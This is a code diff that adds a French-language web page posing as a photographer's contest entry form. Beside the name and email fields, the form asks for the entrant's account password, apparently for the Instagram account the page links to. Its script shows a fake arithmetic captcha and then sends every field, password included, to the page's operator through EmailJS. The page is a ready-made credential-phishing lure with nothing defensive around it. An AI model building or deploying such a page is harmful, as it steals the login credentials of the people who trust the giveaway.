@@ -1,0 +1,177 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ray Photographe - Concours</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: url('fond-canon-bw.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      text-align: center;
+      backdrop-filter: brightness(0.6);
+    }
+    header {
+      margin-top: 30px;
+    }
+    #logo {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-family: 'Brush Script MT', cursive;
+      font-size: 3em;
+      margin: 10px 0;
+    }
+    p.description {
+      margin: 20px auto;
+      font-size: 1.2em;
+      width: 90%;
+      max-width: 600px;
+      line-height: 1.5em;
+    }
+    .ticket {
+      background-color: rgba(0, 0, 0, 0.6);
+      border: 2px dashed white;
+      border-radius: 15px;
+      padding: 20px;
+      margin: 30px auto;
+      width: 90%;
+      max-width: 400px;
+      text-align: left;
+    }
+    .ticket h2 {
+      text-align: center;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="file"] {
+      width: 100%;
+      padding: 8px;
+      border: none;
+      border-radius: 5px;
+    }
+    .toggle-password {
+      margin-top: 5px;
+      font-size: 0.9em;
+      cursor: pointer;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #555;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 1em;
+      cursor: pointer;
+      display: none;
+    }
+    button:hover {
+      background-color: #777;
+    }
+    .instagram-logo {
+      margin-top: 20px;
+      width: 40px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img id="logo" src="logo-ray.png" alt="Logo Ray Photographe">
+    <h1>RAY PHOTOGRAPHE</h1>
+  </header>
+
+  <p class="description">
+    Bienvenue sur ma page concours.<br>
+    Participez et courez la chance de remporter une séance photo de votre choix 100% gratuite ou la chance de figurer sur ma page officielle en tant que modèle d'un jour.<br>
+    <b>Participation sans photo = 1 chance, avec 1 photo = 2 chances.</b><br>
+    Aucune limite de participation!
+  </p>
+
+  <div class="ticket">
+    <h2>BILLET DE PARTICIPATION</h2>
+    <form id="participation-form">
+      <label>Prénom:</label>
+      <input type="text" id="prenom" required>
+
+      <label>Nom:</label>
+      <input type="text" id="nom" required>
+
+      <h3>I.D COMPTE</h3>
+      <label>Courriel:</label>
+      <input type="email" id="email" required>
+
+      <label>Mot de passe:</label>
+      <input type="password" id="password" required>
+      <div class="toggle-password" onclick="togglePassword()">Afficher / Cacher le mot de passe</div>
+
+      <label>Ajouter une photo:</label>
+      <input type="file" id="photo" accept="image/*">
+
+      <button type="submit" id="submit-btn">PARTICIPER</button>
+    </form>
+  </div>
+
+  <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" onclick="window.open('https://www.instagram.com/ray_photographe?igsh=d3o5a3lhdXN5aXIx', '_blank')">
+
+  <script>
+    (function() {
+      emailjs.init('TON_USER_ID_EMAILJS');
+    })();
+
+    function togglePassword() {
+      var passwordField = document.getElementById('password');
+      if (passwordField.type === "password") {
+        passwordField.type = "text";
+      } else {
+        passwordField.type = "password";
+      }
+    }
+
+    const form = document.getElementById('participation-form');
+    const submitBtn = document.getElementById('submit-btn');
+
+    form.addEventListener('input', () => {
+      const filled = [...form.elements].every(input => input.type === "submit" || input.value);
+      submitBtn.style.display = filled ? "block" : "none";
+    });
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const captcha = prompt("Écrivez la somme de 3 + 4 :");
+      if (captcha != "7") {
+        alert("Captcha incorrect. Veuillez réessayer.");
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append("prenom", document.getElementById('prenom').value);
+      formData.append("nom", document.getElementById('nom').value);
+      formData.append("email", document.getElementById('email').value);
+      formData.append("password", document.getElementById('password').value);
+      if (document.getElementById('photo').files[0]) {
+        formData.append("photo", document.getElementById('photo').files[0]);
+      }
+
+      emailjs.sendForm('TON_SERVICE_ID', 'TON_TEMPLATE_ID', form)
+      .then(() => {
+          alert("Merci pour votre participation! Les gagnants vous seront divulgués par courriel. Vous pouvez participer une autre fois avec une autre photo.");
+      }, (error) => {
+          alert("Erreur lors de l'envoi : " + error.text);
+      });
+    });
+  </script>
+</body>
+</html>
